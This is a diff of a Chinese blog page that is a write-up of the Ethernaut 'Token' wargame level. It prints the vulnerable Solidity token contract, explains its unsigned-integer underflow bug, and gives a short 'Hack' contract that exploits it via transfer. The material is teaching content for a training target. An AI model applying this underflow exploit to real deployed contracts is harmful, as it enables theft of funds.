@@ -35,21 +35,21 @@
   <!-- feed -->
   <!-- 页面元数据 -->
   <title>Token - 笔友🍉の知识库</title>
-  <meta name="keywords" content="靶场,Solidity,null">
+  <meta name="keywords" content="Solidity,靶场,null">
   <meta desc name="description" content="Self-Discipline - 笔友🍉 - 笔友🍉の知识库">
   
 <meta property="og:type" content="article">
 <meta property="og:title" content="Token">
 <meta property="og:url" content="https://biyouqiuqiu.com/2023/01/08/Smart%20contracts/ethernaut/Token/index.html">
 <meta property="og:site_name" content="笔友🍉の知识库">
-<meta property="og:description" content="Token1. 题目要求 1.1 这一关的目标是攻破下面这个基础 token 合约  1.2 你最开始有20个 token, 如果你通过某种方法可以增加你手中的 token 数量,你就可以通过这一关,当然越多越好  1.3 合约代码：   &#x2F;&#x2F; SPDX-License-Identifier: MIT pragma solidity ^0.6.0;  contract Token &amp;#123;">
+<meta property="og:description" content="Token1. 题目要求 1.1 这一关的目标是攻破下面这个基础 token 合约  1.2 你最开始有20个 token, 如果你通过某种方法可以增加你手中的 token 数量,你就可以通过这一关,当然越多越好  1.3 合约代码：    1234567891011121314151617181920212223&#x2F;&#x2F; SPDX-License-Identifier: MITpragma soli">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
 <meta property="article:published_time" content="2023-01-08T06:30:10.000Z">
 <meta property="article:modified_time" content="2023-01-08T06:30:10.000Z">
 <meta property="article:author" content="笔友🍉">
-<meta property="article:tag" content="靶场">
 <meta property="article:tag" content="Solidity">
+<meta property="article:tag" content="靶场">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
   <style>
@@ -1794,7 +1794,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1690522141791),
+    lastupdate: new Date(1692682587051),
     sidebar: {
       for_page: ["blogger","category","tagcloud","webinfo","qrcode"],
       for_post: ["toc","blogger","qrcode"],
@@ -2995,7 +2995,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <div class="new-meta-item wordcount">
     <a class='notlink'>
       <i class="fa-solid fa-keyboard fa-fw" aria-hidden="true"></i>
-      <p>字数：405 字</p>
+      <p>字数：403 字</p>
     </a>
   </div>
   <div class="new-meta-item readtime">
@@ -3052,36 +3052,28 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </li>
 <li><p>1.2 你最开始有20个 token, 如果你通过某种方法可以增加你手中的 token 数量,你就可以通过这一关,当然越多越好</p>
 </li>
-<li><p>1.3 合约代码： </p>
+<li><p>1.3 合约代码：</p>
 </li>
-<li><pre><code class="solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
+</ul>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  constructor(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-contract Token &#123;
 
-  mapping(address =&gt; uint) balances;
-  uint public totalSupply;
 
-  constructor(uint _initialSupply) public &#123;
-    balances[msg.sender] = totalSupply = _initialSupply;
-  &#125;
-
-  function transfer(address _to, uint _value) public returns (bool) &#123;
-    require(balances[msg.sender] - _value &gt;= 0);
-    balances[msg.sender] -= _value;
-    balances[_to] += _value;
-    return true;
-  &#125;
-
-  function balanceOf(address _owner) public view returns (uint balance) &#123;
-    return balances[_owner];
-  &#125;
-&#125;
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 2. 分析</span><br><span class="line"></span><br><span class="line">- 2.1 编译器版本：`^0.6.0`，且没用SafeMath库，所以可能出现整数溢出漏洞</span><br><span class="line"></span><br><span class="line">- 2.2  代码分析：</span><br><span class="line"></span><br><span class="line">- `require(balances[msg.sender] - _value &gt;= 0);`检查用户余额是否大于或等于零，但由于余额是无符号整数，当我们减去的数字 ( `_value`) 大于代`balances[msg.sender]`币的钱包余额 ( ) 时，就会发生溢出，钱包余额变为最大无符号整数减去这两个值之间的差值。</span><br><span class="line"></span><br><span class="line">  通过 require 语句后，还有一个错误是将这个溢出的值赋值给 的余额`msg.sender`：</span><br><span class="line"></span><br><span class="line">- 2.3 攻击合约：</span><br><span class="line"></span><br><span class="line">- ```solidity</span><br><span class="line">  contract Hack &#123;</span><br><span class="line">  </span><br><span class="line">      function attarck() public &#123;</span><br><span class="line">        // 实例地址</span><br><span class="line">          Token token = Token(0x03130C8ca692f8980461A9C96411aAf5e0A71AcB);</span><br><span class="line">        // 自己的钱包地址</span><br><span class="line">          token.transfer(0x2DeF5505E8EfaD8dF16eFE1dFd8a49f52360b2e8,100);</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
-</code></pre>
+<h2 id="2-分析"><a href="#2-分析" class="headerlink" title="2. 分析"></a>2. 分析</h2><ul>
+<li><p>2.1 编译器版本：<code>^0.6.0</code>，且没用SafeMath库，所以可能出现整数溢出漏洞</p>
 </li>
-<li><p>2.4 调用Hack 合约中的 attract() 函数</p>
+<li><p>2.2  代码分析：</p>
 </li>
+<li><p><code>require(balances[msg.sender] - _value &gt;= 0);</code>检查用户余额是否大于或等于零，但由于余额是无符号整数，当我们减去的数字 ( <code>_value</code>) 大于代<code>balances[msg.sender]</code>币的钱包余额 ( ) 时，就会发生溢出，钱包余额变为最大无符号整数减去这两个值之间的差值。</p>
+<p>通过 require 语句后，还有一个错误是将这个溢出的值赋值给 的余额<code>msg.sender</code>：</p>
+</li>
+<li><p>2.3 攻击合约：</p>
+</li>
+</ul>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line"></span><br><span class="line">    function attarck() public &#123;</span><br><span class="line">      // 实例地址</span><br><span class="line">        Token token = Token(0x03130C8ca692f8980461A9C96411aAf5e0A71AcB);</span><br><span class="line">      // 自己的钱包地址</span><br><span class="line">        token.transfer(0x2DeF5505E8EfaD8dF16eFE1dFd8a49f52360b2e8,100);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>2.4 调用Hack 合约中的 attract() 函数</li>
 </ul>
 <h2 id="3-解题"><a href="#3-解题" class="headerlink" title="3. 解题"></a>3. 解题</h2><ul>
 <li><p>3.1 获取关卡实例地址：0x03130C8ca692f8980461A9C96411aAf5e0A71AcB</p>
@@ -3176,8 +3168,8 @@ contract Token &#123;
         
           
   
-  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="nofollow"><i class="fa-solid fa-bookmark fa-fw" aria-hidden="true"></i><p>靶场</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Solidity/" rel="nofollow"><i class="fa-solid fa-bookmark fa-fw" aria-hidden="true"></i><p>Solidity</p></a></div>
-  <span hidden itemprop="keywords">靶场 Solidity</span>
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Solidity/" rel="nofollow"><i class="fa-solid fa-bookmark fa-fw" aria-hidden="true"></i><p>Solidity</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="nofollow"><i class="fa-solid fa-bookmark fa-fw" aria-hidden="true"></i><p>靶场</p></a></div>
+  <span hidden itemprop="keywords">Solidity 靶场</span>
 
 
         
@@ -3212,10 +3204,8 @@ contract Token &#123;
 
 题目代码：
 
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
 
-...</p>
+ 123456789101112131415161718// SPDX-License-Identifier: ...</p>
         </a>
       
       
@@ -3387,7 +3377,7 @@ pragma solidity ^0.8.0;
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E9%A2%98%E7%9B%AE%E8%A6%81%E6%B1%82"><span class="toc-text">1. 题目要求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%A7%A3%E9%A2%98"><span class="toc-text">3. 解题</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E9%A2%98%E7%9B%AE%E8%A6%81%E6%B1%82"><span class="toc-text">1. 题目要求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%88%86%E6%9E%90"><span class="toc-text">2. 分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%A7%A3%E9%A2%98"><span class="toc-text">3. 解题</span></a></li></ol>
     </div>
   </section>
 
@@ -4435,7 +4425,7 @@ window.matchMedia('(prefers-color-scheme: light)').addListener(darkModelListener
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"笔友🍉の知识库","url":"https://biyouqiuqiu.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"笔友🍉","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://biyouqiuqiu.com/","sameAs":["https://github.com/volantis-x"],"description":"Self-Discipline"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://biyouqiuqiu.com/","name":"笔友🍉の知识库"}},{"@type":"ListItem","position":2,"item":{"@id":"https://biyouqiuqiu.com/categories/Smart-contracts/","name":"Smart contracts"}},{"@type":"ListItem","position":2,"item":{"@id":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/","name":"ethernaut"}},{"@type":"ListItem","position":3,"item":{"@id":"https://biyouqiuqiu.com/2023/01/08/Smart contracts/ethernaut/Token/","name":"Token"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"笔友🍉の知识库","url":"https://biyouqiuqiu.com/","keywords":null,"description":"Self-Discipline","author":{"@type":"Person","name":"笔友🍉","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://biyouqiuqiu.com/","description":"Self-Discipline"},"publisher":{"@type":"Organization","name":"笔友🍉の知识库","url":"https://biyouqiuqiu.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://biyouqiuqiu.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"Token","description":"Self-Discipline","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https://biyouqiuqiu.com/2023/01/08/Smart%20contracts/ethernaut/Token/"},"author":{"@type":"Person","name":"笔友🍉","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://biyouqiuqiu.com/"},"publisher":{"@type":"Organization","name":"笔友🍉の知识库","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://biyouqiuqiu.com/2023/01/08/Smart%20contracts/ethernaut/Token/","wordCount":0,"datePublished":"2023-01-08T06:30:10.000Z","dateModified":"2023-01-08T06:30:10.000Z","articleSection":"Smart contracts","keywords":"靶场,Solidity","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"笔友🍉の知识库","url":"https://biyouqiuqiu.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"笔友🍉","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://biyouqiuqiu.com/","sameAs":["https://github.com/volantis-x"],"description":"Self-Discipline"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://biyouqiuqiu.com/","name":"笔友🍉の知识库"}},{"@type":"ListItem","position":2,"item":{"@id":"https://biyouqiuqiu.com/categories/Smart-contracts/","name":"Smart contracts"}},{"@type":"ListItem","position":2,"item":{"@id":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/","name":"ethernaut"}},{"@type":"ListItem","position":3,"item":{"@id":"https://biyouqiuqiu.com/2023/01/08/Smart contracts/ethernaut/Token/","name":"Token"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"笔友🍉の知识库","url":"https://biyouqiuqiu.com/","keywords":null,"description":"Self-Discipline","author":{"@type":"Person","name":"笔友🍉","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://biyouqiuqiu.com/","description":"Self-Discipline"},"publisher":{"@type":"Organization","name":"笔友🍉の知识库","url":"https://biyouqiuqiu.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://biyouqiuqiu.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"Token","description":"Self-Discipline","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https://biyouqiuqiu.com/2023/01/08/Smart%20contracts/ethernaut/Token/"},"author":{"@type":"Person","name":"笔友🍉","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://biyouqiuqiu.com/"},"publisher":{"@type":"Organization","name":"笔友🍉の知识库","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://biyouqiuqiu.com/2023/01/08/Smart%20contracts/ethernaut/Token/","wordCount":0,"datePublished":"2023-01-08T06:30:10.000Z","dateModified":"2023-01-08T06:30:10.000Z","articleSection":"Smart contracts","keywords":"Solidity,靶场","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
